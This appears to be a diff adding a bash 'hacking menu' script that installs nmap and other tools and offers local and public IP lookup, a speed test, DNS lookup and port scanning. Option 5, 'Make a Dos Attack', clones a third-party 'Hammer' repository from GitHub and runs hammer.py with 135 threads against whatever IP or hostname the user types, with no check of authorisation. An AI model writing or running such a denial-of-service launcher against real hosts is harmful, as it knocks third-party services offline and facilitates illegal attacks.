@@ -1,0 +1,95 @@
+#!/bin/bash
+clear
+echo "Please Wait For Update..."
+#Install All Tools
+sudo apt-get -y install nmap | grep -v ''
+sudo apt-get -y install git | grep -v ''
+sudo apt-get -y install speedtest-cli | grep -v ''
+sudo apt-get -y install python-pip | grep -v ''
+num=1
+ip=2
+link=3
+while [[ $num != 0 ]]
+do
+	clear
+echo -e "\033[0;33m
+*****************************************************************************************************************
+*__      _____ _    _    ___ ___  __  __ ___   _____ ___    _____ _  _ ___   __  __   _   ___ _  _ ___ _  _ ___ *
+*\ \    / / __| |  | |  / __/ _ \|  \/  | __| |_   _/ _ \  |_   _| || | __| |  \/  | /_\ / __| || |_ _| \| | __|*
+* \ \/\/ /| _|| |__| |_| (_| (_) | |\/| | _|    | || (_) |   | | | __ | _|  | |\/| |/ _ \ (__| __ || ||    | _| *
+*  \_/\_/ |___|____|____\___\___/|_|  |_|___|   |_| \___/    |_| |_||_|___| |_|  |_/_/ \_\___|_||_|___|_|\_|___|*
+*                                                                                                               *
+*****************************************************************************************************************
+*                                                                                                               *
+*	1  -  Show Your Local IP Address .                                                                      *
+*                                                                                                               *
+*	2  -  Show Your Public IP Adsress .                                                                     *
+*	                                                                                                        *
+*	3  -  Test Your Internet Speed .                                                                        *
+*                                                                                                               *
+*	4  -  Get The IP Address Of A Website .                                                                 *
+*                                                                                                               *
+*	5  -  Make a Dos Attack .                                                                               *
+*                                                                                                               *
+*	6  -  Use Nmap To Scan Ports .                                                                          *
+*                                                                                                               *
+*	0  -  Exit.                                                                                             *
+*                                                                                                               *
+*****************************************************************************************************************\033[0;37m"
+read -p "Please Enter a Number: " num
+if [[ $num == 1 ]]
+then
+	echo "Your Local IP Address Is :"
+	hostname -I
+	echo -e "\033[0;31m\n\nPress enter To Continue !!!\033[0;37m";
+	read oo
+
+elif [[ $num == 2 ]]
+then
+	echo "Your Public IP Address Is :"
+	curl ifconfig.me
+	echo -e "\033[0;31m\n\nPress enter To Continue !!! \033[0;37m"
+	read oo
+elif [[ $num == 3 ]]
+then
+	speedtest-cli
+	echo -e "\033[0;31m\n\nPress enter To Continue !!!\033[0;37m"
+	read oo
+
+elif [[ $num == 4 ]]
+then
+	read -p "Please Enter The Website Link : /" link
+	nslookup $link | grep -v '#' | grep Address | awk '{print$2}' | grep -v ':'
+	echo -e "\033[0;31m\n\nPress Enter To Continue !!!\033[0;37m"
+	read oo
+
+elif [[ $num == 5 ]]
+then
+	rm -rf Hammer
+	git clone https://github.com/rk1342k/Hammer.git
+	cd Hammer
+	echo -e "'\033[0;31m'\n Warning !! To Stop The Attack Press 'Ctrl + c' ....\n\033[0;37m"
+	read -p "Enter The IP Address Or Hostname Of The Target : " ip
+	python3 hammer.py -s $ip -t 135
+	read oo
+elif [[ $num == 6 ]]
+then
+	read -p "Please enter A (Hostname Or Ip Address) To Scan : " ip
+	nmap $ip
+	echo -e "\033[0;31m\n\nPress Enter To Continue !!!\033[0;37m"
+	read oo
+
+elif [[ $num == 0 ]]
+then
+	rm -rf Hammer
+	clear
+	echo -e "\033[0;36m  _____ _              _         _____      _   _           _____ _    _      ___         _      _   
+ |_   _| |_  __ _ _ _ | |__ ___ |_   _|__  | | | |___ ___  |_   _| |_ (_)___ / __| __ _ _(_)_ __| |_ 
+   | | | ' \/ _. | ' \| / /(_-<   | |/ _ \ | |_| (_-</ -_)   | | | ' \| (_-< \__ \/ _| '_| | '_ \  _|
+   |_| |_||_\__,_|_||_|_\_\/__/   |_|\___/  \___//__/\___|   |_| |_||_|_/__/ |___/\__|_| |_| .__/\__|
+                                                                                           |_|  \033[0;37m  "
+else
+	echo -e "\033[0;31m\n\nYou Have A Wrong Number !!!\033[0;37m"
+	read oo
+fi
+done
